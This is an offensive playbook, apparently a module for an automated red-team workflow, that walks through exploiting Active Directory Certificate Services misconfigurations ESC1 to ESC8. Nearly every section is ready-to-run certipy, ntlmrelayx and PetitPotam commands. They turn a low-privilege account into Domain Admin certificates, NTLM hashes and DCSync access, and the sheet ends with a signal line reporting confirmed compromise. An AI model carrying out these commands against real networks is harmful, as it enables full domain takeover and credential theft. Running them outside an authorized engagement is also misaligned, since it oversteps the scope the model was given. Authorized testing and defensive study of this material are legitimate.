# ADCS - Active Directory Certificate Services ESC1-ESC8

**MITRE:** T1649 | **When:** AD confirmed + ADCS enrollment endpoints found.

## Enumerate ADCS (certipy)

```bash
# Find CA + vulnerable templates:
certipy find -u normaluser@corp.local -p 'Password!' -dc-ip <DC_IP>
certipy find -u normaluser@corp.local -p 'Password!' -dc-ip <DC_IP> -vulnerable -stdout

# Output shows:
# Certificate Authority: corp-CA
# Vulnerable templates with: ESC1-ESC8 flags
```

## ESC1 - Enrollee Supplies Subject (most common)

```bash
# Template has: msPKI-Certificate-Name-Flag = ENROLLEE_SUPPLIES_SUBJECT
# + CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT
# Allows requesting cert for ANY user (including Domain Admin)

# Request cert as DA:
certipy req -u normaluser@corp.local -p 'Password!' \
  -ca corp-CA -template VulnerableTemplate \
  -upn administrator@corp.local \
  -dc-ip <DC_IP>
# Output: administrator.pfx

# Authenticate as DA using cert:
certipy auth -pfx administrator.pfx -domain corp.local -dc-ip <DC_IP>
# Returns: administrator NTLM hash + TGT

# Now PTH or use TGT:
wmiexec.py -hashes :<NTLM_HASH> corp.local/administrator@<DC_IP>
```

## ESC2 - Any Purpose EKU

```bash
# Template with Any Purpose EKU or no EKU = can be used for client auth
# Exploit same as ESC1 - request for high-priv user
certipy req -u normaluser@corp.local -p 'Password!' \
  -ca corp-CA -template ESC2Template \
  -upn administrator@corp.local -dc-ip <DC_IP>
```

## ESC3 - Certificate Agent (Enrollment Agent)

```bash
# Step 1: Get enrollment agent certificate:
certipy req -u normaluser@corp.local -p 'Password!' \
  -ca corp-CA -template EnrollmentAgentTemplate -dc-ip <DC_IP>
# Output: normaluser.pfx (enrollment agent cert)

# Step 2: Request cert on behalf of Domain Admin:
certipy req -u normaluser@corp.local -p 'Password!' \
  -ca corp-CA -template UserTemplate \
  -on-behalf-of 'corp\administrator' \
  -pfx normaluser.pfx -dc-ip <DC_IP>
# Output: administrator.pfx
```

## ESC4 - Template ACL Misconfiguration

```bash
# Template has WriteDACL/WriteOwner/WriteProperty for low-priv user
# Step 1: Modify template to be vulnerable to ESC1:
certipy template -u normaluser@corp.local -p 'Password!' \
  -template VulnerableACLTemplate -save-old -dc-ip <DC_IP>

# Step 2: Exploit as ESC1, then restore template
certipy req -u normaluser@corp.local -p 'Password!' \
  -ca corp-CA -template VulnerableACLTemplate \
  -upn administrator@corp.local -dc-ip <DC_IP>
```

## ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2 on CA

```bash
# CA has EDITF_ATTRIBUTESUBJECTALTNAME2 flag = user-supplied SAN on ANY template
# Even if template doesn't have ENROLLEE_SUPPLIES_SUBJECT
certipy req -u normaluser@corp.local -p 'Password!' \
  -ca corp-CA -template User \
  -upn administrator@corp.local -dc-ip <DC_IP>
```

## ESC7 - CA Officer / Manager Role Abuse

```bash
# If user has ManageCertificates or ManageCA rights on CA:
# Issue failed/pending certs, approve requests, modify CA settings
certipy ca -u normaluser@corp.local -p 'Password!' \
  -ca corp-CA -enable-template SubCA -dc-ip <DC_IP>
# Then issue sub-CA cert and sign arbitrary certs
```

## ESC8 - NTLM Relay to Web Enrollment

```bash
# ADCS web enrollment HTTP endpoint: https://<CA>/certsrv
# No HTTPS = NTLM relay attack possible

# Step 1: Set up relay server:
ntlmrelayx.py -t http://<CA>/certsrv/certfnsh.asp \
  -smb2support --adcs --template DomainController

# Step 2: Coerce DC authentication (PetitPotam):
PetitPotam.py <RELAY_HOST> <DC_IP>
# OR: printerbug.py corp.local/normaluser:'Password!'@<DC_IP> <RELAY_HOST>

# Result: DC certificate received = DCSync possible
certipy auth -pfx dc.pfx -dc-ip <DC_IP>
```

**Evidence:** certipy auth returns NTLM hash for administrator/DC account.

**Signal:** `emit_signal VULN_CONFIRMED "ADCS ESC<N>: DA cert obtained via <template>" "main/redteam" 0.97`
